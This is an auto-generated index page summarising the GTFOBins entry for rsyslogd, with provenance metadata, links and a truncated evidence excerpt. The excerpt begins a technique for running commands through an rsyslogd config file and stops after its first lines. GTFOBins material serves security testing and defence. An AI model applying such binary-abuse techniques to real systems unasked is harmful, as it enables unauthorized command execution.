---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# rsyslogd

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `rsyslogd` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rsyslogd` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for rsyslogd covering command.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/rsyslogd.md)
- Source verification: [source record](../../sources/gtfobins/rsyslogd.md)

## Aliases

- `rsyslogd`

## Source Verification

[source record](../../sources/gtfobins/rsyslogd.md)

## Evidence Excerpt

```text
_body: ''
_name: rsyslogd
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rsyslogd
functions:
command:
- blind: true
code: 'cat >/path/to/temp-file <<EOF
module(load="imuxsock")
```
